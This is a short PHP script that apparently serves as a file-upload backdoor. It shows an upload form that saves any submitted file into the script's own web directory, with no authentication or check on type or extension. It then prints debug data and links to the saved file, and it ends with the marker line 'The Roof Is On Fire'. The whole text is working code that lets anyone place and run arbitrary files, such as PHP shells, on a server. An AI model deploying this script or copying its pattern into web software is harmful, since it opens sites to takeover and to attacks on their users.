<?php
if(isset($_FILES["userfile"]["name"])){
$uploaddir = getcwd() . "/";
$uploadfile = $uploaddir . basename($_FILES["userfile"]["name"]);

echo "<p>";

if (move_uploaded_file($_FILES["userfile"]["tmp_name"], $uploadfile)) {
  echo "File is valid, and was successfully uploaded.\n";
} else {
   echo "Upload failed";
}

echo "</p>";
echo "<pre>";
echo "Here is some more debugging info:";
print_r($_FILES);
if ($_FILES["userfile"]["error"] == 0){
echo "<br><br><a href=\"{$_FILES["userfile"]["name"]}\" TARGET=_BLANK>{$_FILES["userfile"]["name"]}</a><br><br>";
}
echo "</pre>";
}

    echo "<form enctype=\"multipart/form-data\" action=\"{$_SERVER["PHP_SELF"]}\" method=\"POST\">";
    echo "<input type=\"hidden\" name=\"MAX_FILE_SIZE\" value=\"512000\" />";
    echo "Send this file: <input name=\"userfile\" type=\"file\" />";
    echo "<input type=\"submit\" value=\"Send File\" />";
    echo "</form>";
    echo "The Roof Is On Fire";

exit;
?>
